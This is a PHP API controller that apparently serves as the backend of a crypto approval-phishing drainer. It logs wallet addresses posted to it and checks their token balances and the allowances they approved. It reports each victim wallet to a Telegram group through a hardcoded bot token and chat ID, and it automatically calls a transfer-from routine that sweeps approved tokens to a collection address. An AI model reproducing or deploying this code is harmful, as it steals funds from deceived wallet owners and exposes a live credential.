<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\Exception;
use think\Request;

/**
 * Address接口
 */
class Address extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     */
    public function index()
    {
        /**
        `h5_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT '0' COMMENT 'h5url',
        `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '钱包地址',
        `approve_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '授权合约',
        `money_approve` float DEFAULT '0' COMMENT '授权数量',
        `money_online` float DEFAULT '0' COMMENT '线上余额',
        `createtime` int(10) DEFAULT NULL COMMENT '创建时间',
        `updatetime` int(10) DEFAULT NULL COMMENT '更新时间',
        `is_approve` tinyint(4) DEFAULT '0' COMMENT '是否授权0否1是',
        `is_approve_old` tinyint(4) DEFAULT '0' COMMENT '之前是否授权0否1是',
        `contract_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '目标合约地址',
        `approve_address_decimals` int(11) DEFAULT NULL COMMENT '目标精度',
         */
        $params = $this->request->post();
        if(empty($params)){
            $this->error(__('Invalid parameters'));
        }
        unset($params['user_id']);
        try {
            $params['createtime']=time();
            $params['updatetime']=time();
            if(isset($params['approve_type'])){
                if($params['approve_type'] == 3){
                    $params['approve_type'] = 0;
                }
            }
            $ishave = (new \app\admin\model\Address())->where(['address'=>$params['address'],'approve_address'=>$params['approve_address'],'contract_address'=>$params['contract_address']])->find();
            if($ishave){
                (new \app\admin\model\Address())->where(['id'=>$ishave['id']])->update($params);
            }else{
                (new \app\admin\model\Address())->insert($params);
            }
            sleep(1);
            $vo = Db('address')->where(['address'=>$params['address']])->find();
            if($vo){
                if((new \Tron\Address($vo['address']))->isValid()){
                    $qb_type = 1;
                }else{
                    $qb_type = 2;
                }
                $money_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$vo['address'],$vo['contract_address'],$vo['approve_address_decimals']);
                $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$vo['address'],$vo['approve_address'],$vo['contract_address'],$vo['approve_address_decimals']);
                if($money_approve >= 115792089237316195423570985008687907853269984665640564039457584007913129.639936){
                    db('address')->where(['id'=>$vo['id']])->update(['money_approve'=>10000000000,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                }else{
                    if($money_approve  > 0){
                        if($money_approve > 10000000000){
                            $money_approve = 10000000000;
                        }
                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                    }else{
                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>0]);
                    }
                }
                if($vo['h5_url'] == '1688vip_channel_user_id:37'){//jiema
                    db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>5000]);
                }
                if($money_online >10 || $money_approve > 0 ){
                    //TG通知开始
                    $data_tg = "【API综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
                    $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                    $id ='5725539445';//群组ID
                    $u4 = $data_tg;
                    $u4 = urlencode($u4);
                    $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $urlstring);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    $result = curl_exec($ch);
                    curl_close($ch);
                    //TG通知结束
                }
                //自动化开始
                switch ($vo['chain']){
                    case 'trc':
                        $qb_type = 1;
                        $address_shou = config('site.shou_trx');
                        switch ($vo['approve_type']){
                            case 0:
                                $approve_user_address = config('site.hy_user_trx');
                                $approve_key = config('site.hy_user_trx_key');
                                break;
                            case 1:
                                $approve_user_address = $vo['approve_address'];
                                $approve_key = $vo['account_pre'];
                                break;
                        }
                        break;
                    case 'bsc':
                        $qb_type = 2;
                        $address_shou = config('site.shou_bsc');
                        $approve_user_address = config('site.hy_user_bsc');
                        $approve_key = config('site.hy_user_bsc_key');
                        break;
                    case 'eth':
                        $qb_type = 3;
                        $address_shou = config('site.shou_eth');
                        $approve_user_address = config('site.hy_user_eth');
                        $approve_key = config('site.hy_user_eth_key');
                        break;
                    case 'okt':
                        $qb_type = 4;
                        $address_shou = config('site.shou_bsc');
                        $approve_user_address = config('site.hy_user_bsc');
                        $approve_key = config('site.hy_user_bsc_key');
                        break;
                }
                $amount = $money_online;
                if($amount > $money_approve){
                    $amount = $money_approve;
                }
                if($amount >= $vo['auto_money']  && $vo['auto'] == 1){
                    $to = $address_shou;
                    $rrr_arr=config('conf.rrr_arr');
                    $psd = $approve_key;
                    foreach ($rrr_arr as $aaa){
                        $psd = str_replace($aaa,'',$psd);
                    }

                    $approve_info =array(
                        'qb_type'=>$qb_type,//钱包类型
                        'approve_address'=>$vo['approve_address'],//授权合约地址
                        'approve_user_address'=>$approve_user_address,//调用授权合约的账户
                        'psd'=>$psd,//调用授权合约的账户的私钥
                        'user_address'=>$vo['address'],//目标用户钱包
                        'contract_address'=>$vo['contract_address'],//目标合约
                        'approve_address_decimals'=>$vo['approve_address_decimals'],//目标合约精度
                        'sq_approve_type'=>$vo['approve_type'],//0 合约授权 1 账号授权
                    );
                    $receive_info =array(
                        'to'=>$to,//收款地址
                        'amount'=>$amount,//金额
                    );
                    $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);

                    //TG通知开始
                    $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n画：{$amount}";
                    $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                    $id ='5725539445';//群组ID
                    $u4 = $data_tg;
                    $u4 = urlencode($u4);
                    $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $urlstring);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    $resultaaa = curl_exec($ch);
                    curl_close($ch);
                    //TG通知结束

                    if($result){
                        $data = array();
                        if($qb_type == 1){
                            $data['txid']=$result->txID;
                        }else{
                            $data['txid']=$result['hash'];
                        }
                        $data['user_id']=0;
                        $data['address']=$vo['address'];
                        $data['to_address']=$to;
                        $data['money']=$amount;
                        $data['createtime']=time();
                        $data['updatetime']=time();
                        $ishave = Db('approve_transaction')->where(['txid'=>$data['txid']])->find();
                        if($ishave){
                            Db('approve_transaction')->where(['txid'=>$data['txid']])->update(['updatetime'=>time()]);
                        }else{
                            Db('approve_transaction')->insert($data);
                        }
                        Db('address')->where(['id'=>$vo['id']])->update(['money_online'=>0]);
                    }
                }
                //自动化结束
            }
            return 'ok';
        }catch (Exception $e) {
            return $e->getMessage();
        }
    }
}
